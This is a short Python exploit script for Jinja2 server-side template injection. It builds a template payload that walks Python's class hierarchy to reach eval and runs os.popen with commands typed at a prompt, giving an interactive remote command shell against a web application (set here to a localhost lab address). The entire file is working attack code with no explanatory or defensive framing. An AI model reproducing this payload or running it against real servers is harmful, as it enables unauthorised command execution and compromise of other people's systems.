import requests


def EXP(url):
    cmd = "whoami"
    while cmd != "exit":
        payload = '''?name=
    {% for c in [].__class__.__base__.__subclasses__() %}
    {% if c.__name__ == 'catch_warnings' %}
      {% for b in c.__init__.__globals__.values() %}
      {% if b.__class__ == {}.__class__ %}
        {% if 'eval' in b.keys() %}
          {{ b['eval']('__import__("os").popen("''' + cmd + '''").read()') }}
        {% endif %}
      {% endif %}
      {% endfor %}
    {% endif %}
    {% endfor %}
    '''
        res = requests.post(url, data=payload)
        msg = res.text.split('Hello')[-1].strip()
        print(msg)
        cmd = input("cmd>>>")


if __name__ == '__main__':
    url = "http://127.0.0.1:5000/"
    EXP(url)
